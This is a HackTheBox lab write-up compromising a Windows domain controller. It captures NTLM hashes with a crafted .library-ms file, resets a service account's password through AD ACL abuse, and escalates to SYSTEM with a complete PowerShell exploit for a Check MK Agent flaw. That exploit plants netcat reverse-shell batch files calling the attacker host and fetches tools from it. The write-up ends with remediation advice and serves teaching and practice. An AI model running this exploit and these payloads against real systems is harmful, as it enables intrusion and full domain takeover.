# HackTheBox — Nanocorp (Hard, Active Directory / Windows)

**Target IP:** `10.129.xx.xx`
**VPN/Attacker IP:** `10.10.xx.xx`
**Domain:** `nanocorp.htb`
**Domain Controller:** `DC01.nanocorp.htb`

---

## 1. Reconnaissance

### 1.1 Nmap Scan

```bash
nmap -sV -sC 10.129.xx.xx
```

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-10 18:18 +0545
Nmap scan report for 10.129.xx.xx
Host is up (0.45s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
80/tcp   open  http              Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-title: Did not follow redirect to http://nanocorp.htb/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-02-10 19:34:33Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb, Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
5986/tcp open  ssl/wsmans?
| ssl-cert: Subject: commonName=dc01.nanocorp.htb
| Subject Alternative Name: DNS:dc01.nanocorp.htb
| Not valid before: 2025-04-06T22:58:43
|_Not valid after:  2026-04-06T23:18:43
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|   h2
|_  http/1.1
Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-02-10T19:36:28
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: 6h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 217.85 seconds
```

A full Active Directory domain controller fingerprint: DNS (53), Kerberos (88), LDAP/LDAPS (389/636/3268/3269), SMB (445), and notably **WinRM over HTTPS on port 5986** (`ssl/wsmans`) with a certificate issued for `dc01.nanocorp.htb`. Port 80 runs Apache/PHP on Windows — unusual for a DC, suggesting a web application is also hosted. The ~7-hour clock skew is noted and will require time synchronisation before Kerberos operations.

### 1.2 /etc/hosts Configuration

```bash
cat /etc/hosts
```
```
10.129.xx.xx  nanocorp.htb DC01.nanocorp.htb DC01
```

Further reconnaissance (virtual host enumeration of the web service) reveals a subdomain:

```bash
cat /etc/hosts
```
```
10.129.xx.xx  nanocorp.htb DC01.nanocorp.htb hire.nanocorp.htb
```

The `hire.nanocorp.htb` subdomain hosts a recruitment/HR-style web application.

---

## 2. Initial Access — CVE-2025-24071 (Windows Search / Library-ms NTLM Credential Leak)

### 2.1 Vulnerability Overview

**CVE-2025-24071** is a Windows vulnerability in which a specially crafted `.library-ms` file (a Windows Search Library definition) causes Windows Explorer to automatically resolve a UNC path embedded within the file when it is merely extracted from a ZIP archive — without the user clicking or opening the file. The OS's indexing/preview mechanism reads the XML and attempts to authenticate to the embedded network share path, leaking the current user's NTLMv2 challenge-response hash to any listener on that path.

This is exploitable anywhere a user or server process extracts a ZIP containing a malicious `.library-ms` file.

### 2.2 Starting a Responder Listener

```bash
sudo responder -I tun0 -v
```

```
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]
...
[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.xx.xx]
    Responder IPv6             [dead:beef:4::1018]
    Challenge set              [random]

[*] Version: Responder 3.2.0.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...
```

### 2.3 Crafting the Malicious Library File

```bash
cat hello.library-ms
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>Hello</name>
  <version>1</version>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.xx.xx\hello</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

The `<url>` tag points to a UNC path on the attacker's machine. When Windows parses this file during archive extraction/indexing, it will attempt an SMB connection to `\\10.10.xx.xx\hello`, triggering NTLM authentication.

### 2.4 Packaging and Delivering the ZIP

```bash
zip hello.zip hello.library-ms
```
```
  adding: hello.library-ms (deflated 49%)
```

The ZIP is uploaded via the `hire.nanocorp.htb` web application (which likely offers a file upload feature for job applicants/CV submissions). The server-side process that extracts the uploaded ZIP triggers the CVE.

### 2.5 Capturing the NTLMv2 Hash

Shortly after the ZIP is uploaded:

```
[SMB] NTLMv2-SSP Client   : 10.129.xx.xx
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:<REDACTED_NTLM_CHALLENGE>:<REDACTED_NTLM_RESPONSE>:<REDACTED_BLOB>
[SMB] NTLMv2-SSP Client   : 10.129.xx.xx
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:<REDACTED_NTLM_CHALLENGE>:<REDACTED_NTLM_RESPONSE>:<REDACTED_BLOB>
```

The `web_svc` service account's NTLMv2 hash is captured — the account running the web application server process.

### 2.6 Cracking the Hash

```bash
john --format=netntlmv2 hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<REDACTED_PASSWORD>   (web_svc)
1g 0:00:00:00 DONE (2026-02-10 18:36) 1.098g/s 2038Kp/s 2038Kc/s 2038KC/s dobson5499..djcward
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

The password for `web_svc` cracks successfully against `rockyou.txt`.

---

## 3. Active Directory Enumeration

### 3.1 Clock Synchronisation

Kerberos requires the attacker's clock to be within 5 minutes of the domain controller's. Given the ~7-hour skew observed in the nmap scan:

```bash
sudo rdate -n 10.129.xx.xx
```
```
Sat Feb 14 19:40:23 +0545 2026
```

### 3.2 Obtaining a Kerberos TGT

```bash
impacket-getTGT 'nanocorp.htb'/'web_svc':'<REDACTED_PASSWORD>'
```

```
[*] Saving ticket in web_svc.ccache
```

```bash
export KRB5CCNAME=web_svc.ccache
```

```bash
klist
```
```
Ticket cache: FILE:web_svc.ccache
Default principal: web_svc@NANOCORP.HTB

Valid starting       Expires              Service principal
02/14/2026 19:41:19  02/15/2026 05:41:19  krbtgt/NANOCORP.HTB@NANOCORP.HTB
        renew until 02/15/2026 19:41:18
```

### 3.3 BloodHound Collection

```bash
bloodhound-python -d nanocorp.htb -u web_svc -k -dc DC01.nanocorp.htb -ns 10.129.xx.xx
```

```
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: nanocorp.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: DC01.nanocorp.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Found 6 users
INFO: Connecting to LDAP server: DC01.nanocorp.htb
INFO: Found 53 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.nanocorp.htb
INFO: Done in 00M 50S
```

### 3.4 BloodHound Attack Path Analysis

BloodHound reveals the following privilege escalation path:

```
web_svc
  ↓ [WriteDACL / GenericAll on IT_SUPPORT group]
IT_SUPPORT (Group)
  ↓ [ForceChangePassword on monitoring_svc]
monitoring_svc
  ↓ [MemberOf]
Remote Management Users
  ↓ [CanPSRemote / WinRM]
DC01.NANOCORP.HTB
```

The chain is:
1. `web_svc` has **WriteDACL / GenericAll** over the `IT_SUPPORT` group → can add itself as a member.
2. The `IT_SUPPORT` group has **ForceChangePassword** over `monitoring_svc` → members can reset its password without knowing the current one.
3. `monitoring_svc` is a member of **Remote Management Users** → eligible for WinRM/PSRemote access to the DC.

---

## 4. Lateral Movement — ACL Abuse to WinRM Access

### 4.1 Adding web_svc to IT_SUPPORT

```bash
bloodyAD --host 10.129.xx.xx -d nanocorp.htb -u 'web_svc' -p '<REDACTED_PASSWORD>' add groupMember IT_SUPPORT web_svc
```
```
[+] web_svc added to IT_SUPPORT
```

Now that `web_svc` is a member of `IT_SUPPORT`, it inherits the group's `ForceChangePassword` right over `monitoring_svc`.

### 4.2 Resetting monitoring_svc's Password

```bash
bloodyAD --host 10.129.xx.xx -d nanocorp.htb -u 'web_svc' -p '<REDACTED_PASSWORD>' set password monitoring_svc 'Password@123'
```
```
[+] Password changed successfully!
```

### 4.3 Obtaining a TGT for monitoring_svc

```bash
impacket-getTGT 'nanocorp.htb'/'monitoring_svc':'Password@123'
```
```
[*] Saving ticket in monitoring_svc.ccache
```

```bash
export KRB5CCNAME=monitoring_svc.ccache
```

```bash
klist
```
```
Ticket cache: FILE:monitoring_svc.ccache
Default principal: monitoring_svc@NANOCORP.HTB

Valid starting       Expires              Service principal
02/14/2026 20:32:45  02/15/2026 00:32:45  krbtgt/NANOCORP.HTB@NANOCORP.HTB
        renew until 02/15/2026 00:32:45
```

### 4.4 WinRM Access as monitoring_svc

WinRM is on port 5986 (HTTPS). Using Impacket's `winrmexec.py` with Kerberos authentication:

```bash
python3 winrmexec.py -ssl -port 5986 -k nanocorp.htb/monitoring_svc@dc01.nanocorp.htb -no-pass
```

```
[*] '-target_ip' not specified, using dc01.nanocorp.htb
[*] '-url' not specified, using https://dc01.nanocorp.htb:5986/wsman
[*] using domain and username from ccache: NANOCORP.HTB\monitoring_svc
[*] '-spn' not specified, using HTTP/dc01.nanocorp.htb@NANOCORP.HTB
[*] requesting TGS for HTTP/dc01.nanocorp.htb@NANOCORP.HTB
PS C:\Users\monitoring_svc\Documents>
```

### 4.5 User Flag

```powershell
PS C:\Users\monitoring_svc\Desktop> type user.txt
```
```
<REDACTED_USER_FLAG>
```

---

## 5. Privilege Escalation — CVE-2024-0670 (Check MK Agent MSI Repair Race Condition)

### 5.1 Identifying Installed Software

```powershell
PS C:\Users\monitoring_svc\Desktop> Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties' | Where-Object { $_.DisplayName -like '*mk*' } | Select-Object LocalPackage, DisplayName
```

```
LocalPackage                   DisplayName
------------                   -----------
C:\Windows\Installer\1e6f2.msi Check MK Agent 2.1
```

**Check MK Agent 2.1** is installed on the domain controller. This version is affected by **CVE-2024-0670**, a local privilege escalation vulnerability in the Check MK Agent MSI repair process.

### 5.2 Vulnerability Overview — CVE-2024-0670

When the Check MK Agent MSI is repaired via `msiexec /fa`, the repair process runs as `NT AUTHORITY\SYSTEM`. During repair, it creates a temporary `.cmd` file in `C:\Windows\Temp` using a **predictable naming pattern** based on the current process ID (`cmk_all_<PID>_<counter>.cmd`). This file is briefly written as writable and then made read-only, but the window between creation and execution can be exploited via a **race condition**: if an attacker pre-seeds `C:\Windows\Temp` with a large number of read-only `.cmd` files matching all plausible PID values, the repair process will find one of these pre-planted files (since it can't overwrite a read-only file) and execute it — running attacker-controlled content as SYSTEM.

### 5.3 The Exploit Script

```powershell
cat exploit.ps1
```

```powershell
param(
    [int]$MinPID = 1000,
    [int]$MaxPID = 15000,
    [string]$LHOST = "10.10.xx.xx",
    [string]$LPORT = "9001"
)

# Path to netcat - must match download location
$NcPath = "C:\Windows\Temp\nc.exe"

# Create batch payload that executes netcat reverse shell
$BatchPayload = "@echo off`r`n`"" + $NcPath + "`" -e cmd.exe " + $LHOST + " " + $LPORT

Write-Host "[*] Looking for Checkmk MSI..."

# Find the Checkmk MSI package in registry
$msi = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties' |
       Where-Object { $_.DisplayName -like '*mk*' } |
       Select-Object -First 1).LocalPackage

if (!$msi) {
    Write-Output "[!] Could not find Checkmk MSI" | Out-File C:\Windows\Temp\cmk_repair.log -Append
    return
}

Write-Output "[*] Found MSI at $msi" | Out-File C:\Windows\Temp\cmk_repair.log -Append

# Seed thousands of read-only .cmd files across all plausible PID values
Write-Output "[*] Seeding PID range $MinPID to $MaxPID..." | Out-File C:\Windows\Temp\cmk_repair.log -Append

foreach ($ctr in 0..1) {
    for ($num = $MinPID; $num -le $MaxPID; $num++) {
        $filePath = "C:\Windows\Temp\cmk_all_$($num)_$($ctr).cmd"
        try {
            # Write malicious batch file
            [System.IO.File]::WriteAllText($filePath, $BatchPayload, [System.Text.Encoding]::ASCII)

            # Make it read-only (critical for race condition)
            (Get-Item $filePath).IsReadOnly = $true
        } catch {
            # Silently ignore write errors
        }
    }
}

Write-Output "[*] Seeding complete." | Out-File C:\Windows\Temp\cmk_repair.log -Append

# Trigger MSI repair - runs as SYSTEM
Write-Output "[*] Triggering MSI repair..." | Out-File C:\Windows\Temp\cmk_repair.log -Append
Start-Process "msiexec.exe" -ArgumentList "/fa `"$msi`" /qn /l*vx C:\Windows\Temp\cmk_repair.log" -Wait
Write-Output "[*] Trigger sent. Check listener." | Out-File C:\Windows\Temp\cmk_repair.log -Append
```

**Exploit logic breakdown:**

1. Locates the Check MK Agent's cached MSI in the registry (`HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\...`).
2. Generates a batch file payload: a `nc.exe`-based reverse shell.
3. Pre-seeds `C:\Windows\Temp` with **28,000+ read-only `.cmd` files** (`cmk_all_<1000..15000>_<0..1>.cmd`), each containing the reverse shell command, covering all plausible PID values the repair process might use.
4. Triggers the MSI repair via `msiexec.exe /fa`. The repair runs as SYSTEM, attempts to create a `.cmd` file in `C:\Windows\Temp` with its own PID in the name, but finds the pre-planted read-only file already exists there. Unable to overwrite it, the process executes the existing (attacker-controlled) file as SYSTEM.

### 5.4 Staging Tools

Tools are downloaded from the attacker's HTTP server to the target:

```powershell
PS C:\Users\monitoring_svc\Desktop> Invoke-WebRequest -Uri "http://10.10.xx.xx/nc.exe" -OutFile "C:\Windows\Temp\nc.exe"
PS C:\Users\monitoring_svc\Desktop> Invoke-WebRequest -Uri "http://10.10.xx.xx/RunasCs.exe" -OutFile "C:\Windows\Temp\RunasCs.exe"
PS C:\Users\monitoring_svc\Desktop> Invoke-WebRequest -Uri "http://10.10.xx.xx/exploit.ps1" -OutFile "C:\Windows\Temp\exp.ps1"
```

### 5.5 Setting Up the Listener

```bash
penelope -p 9001
```

```
[+] Listening for reverse shells on 0.0.0.0:9001 →  127.0.0.1 • 192.168.xx.xx • 172.17.0.1 • 172.18.0.1 • 10.10.xx.xx
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

### 5.6 Running the Exploit

The exploit must run as `web_svc` (which has write access to `C:\Windows\Temp` in this scenario). `RunasCs` is used to launch the PowerShell exploit script under the `web_svc` identity from the `monitoring_svc` session:

```powershell
PS C:\Users\monitoring_svc\Desktop> C:\Windows\Temp\RunasCs.exe web_svc "<REDACTED_PASSWORD>" 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Windows\Temp\exp.ps1"'
```

The exploit seeds the temp directory and triggers the MSI repair.

### 5.7 Catching the SYSTEM Shell

```
[+] Got reverse shell from DC01~10.129.xx.xx-Microsoft_Windows_Server_2022_Standard-x64-based_PC 😍 Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1], Shell Type: Readline, Menu key: Ctrl-D
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\Windows\system32>whoami
whoami
nt authority\system
```

`NT AUTHORITY\SYSTEM` on `DC01` — full domain compromise.

### 5.8 Root Flag

```
C:\Users\Administrator\Desktop>type root.txt
```
```
<REDACTED_ROOT_FLAG>
```

---

## 6. Attack Chain Summary

| Step | Technique | Result |
|------|-----------|--------|
| 1 | Nmap scan | Identified AD DC services, Apache/PHP on Windows, WinRM-HTTPS on 5986; noted `hire.nanocorp.htb` subdomain |
| 2 | CVE-2025-24071 — crafted `.library-ms` inside a ZIP, uploaded to `hire.nanocorp.htb` | Server-side extraction triggered automatic UNC path resolution → Responder captured NTLMv2 hash for `web_svc` |
| 3 | John the Ripper cracked `web_svc`'s NTLMv2 hash against rockyou.txt | Plaintext password recovered |
| 4 | Clock sync via `rdate`; obtained Kerberos TGT for `web_svc` | Kerberos-authenticated sessions available |
| 5 | BloodHound enumeration via `bloodhound-python` | Discovered attack path: `web_svc` → WriteDACL on `IT_SUPPORT` → ForceChangePassword on `monitoring_svc` → WinRM on DC01 |
| 6 | bloodyAD: added `web_svc` to `IT_SUPPORT` group | Inherited `ForceChangePassword` right over `monitoring_svc` |
| 7 | bloodyAD: reset `monitoring_svc` password | Valid credential for the monitoring service account |
| 8 | impacket-getTGT + winrmexec.py (Kerberos, SSL, port 5986) | WinRM shell as `monitoring_svc` on DC01; user flag captured |
| 9 | Identified Check MK Agent 2.1 via registry; vulnerable to CVE-2024-0670 | MSI repair race-condition LPE path identified |
| 10 | Seeded `C:\Windows\Temp` with 28,000+ read-only malicious `.cmd` files (PID space coverage) | Pre-planted SYSTEM-executed reverse shell payload |
| 11 | Triggered `msiexec /fa` (MSI repair) via exploit script run as `web_svc` using `RunasCs` | Check MK repair process executed attacker's pre-planted batch file as `NT AUTHORITY\SYSTEM` |
| 12 | Caught SYSTEM reverse shell | Full DC compromise; root flag captured |

---

## 7. Tools Used

- `nmap` — port/service scanning
- `Responder` — NTLMv2 hash capture via SMB
- `John the Ripper` — offline NTLMv2 hash cracking
- `rdate` — clock synchronisation for Kerberos
- `impacket-getTGT` — Kerberos TGT acquisition
- `bloodhound-python` — AD enumeration and attack path analysis
- `BloodHound` — privilege escalation path visualisation
- `bloodyAD` — AD object manipulation (group membership, password reset)
- `winrmexec.py` (Impacket) — Kerberos-authenticated WinRM shell over HTTPS
- `penelope` — reverse shell handler with readline support
- `RunasCs` — launching processes as a different local/domain user without an interactive logon
- `nc.exe` (netcat for Windows) — reverse shell payload
- Python HTTP server — staging tool delivery

---

## 8. Key Takeaways / Remediation

1. **CVE-2025-24071 (Windows Search Library File NTLM Leak via ZIP Extraction):** Any web application that extracts user-uploaded ZIP files on a Windows host is potentially vulnerable. Windows Explorer/Shell's automatic resolution of `.library-ms` UNC paths during indexing/preview leaks the processing account's NTLMv2 credentials without any user interaction. Defenses include patching (apply the February 2025 Patch Tuesday update), not running web server processes as domain accounts with any privilege, and enforcing IMDSv2-equivalent controls for SMB — such as blocking outbound SMB from web servers to untrusted external addresses.
2. **Service Accounts as Domain Users with Excessive ACL Rights:** The `web_svc` account had WriteDACL/GenericAll over the `IT_SUPPORT` group, and that group held ForceChangePassword over another service account. Service accounts should be provisioned with the minimum domain rights required for their function, and ACL grants between service accounts and privileged groups should be audited regularly (ideally with BloodHound). Where possible, service accounts should be Managed Service Accounts (MSA/gMSA) with automatically rotated, non-crackable passwords.
3. **Crackable Service Account Passwords:** The `web_svc` NTLMv2 hash cracked in seconds against `rockyou.txt`. Domain accounts — especially service accounts — must use long, random, non-dictionary passwords. gMSA accounts eliminate this risk entirely by using 240-character auto-rotating passwords.
4. **Password Reset Chains (ForceChangePassword):** The `IT_SUPPORT` group's `ForceChangePassword` right over `monitoring_svc` enabled trivial account takeover with no prior knowledge of the target's password. `ForceChangePassword` grants should be reviewed and restricted; where helpdesk/support groups need to assist users, consider scoping to non-privileged OU subtrees only, not service accounts.
5. **CVE-2024-0670 (Check MK Agent MSI Repair Race Condition):** The Check MK Agent's MSI repair process created temporary files with predictable names in a user-writable directory (`C:\Windows\Temp`) and ran them as SYSTEM. This is a textbook TOCTOU (Time-Of-Check Time-Of-Use) race condition. The fix is patching Check MK Agent to a version beyond 2.1 that resolves CVE-2024-0670. More broadly, MSI repair processes should never execute attacker-controllable files from shared, world-writable directories; temporary files should be created in paths inaccessible to non-SYSTEM users.
6. **World-Writable System Directories:** `C:\Windows\Temp` being writable by the `web_svc` user (a domain account) was a prerequisite for pre-seeding the exploit files. Tighten ACLs on `C:\Windows\Temp` to limit write access to only the accounts and services that genuinely require it.
7. **WinRM Exposed on a DC:** While WinRM (especially HTTPS on 5986) is a legitimate management channel, exposing it to broad network segments increases the attack surface. WinRM access to domain controllers should be restricted by firewall policy to only trusted jump hosts and management IPs.

---

*Flags and sensitive values (passwords, hashes) have been redacted. IP addresses replaced with placeholders (`10.129.xx.xx` for target, `10.10.xx.xx` for attacker/VPN) per the established convention.*
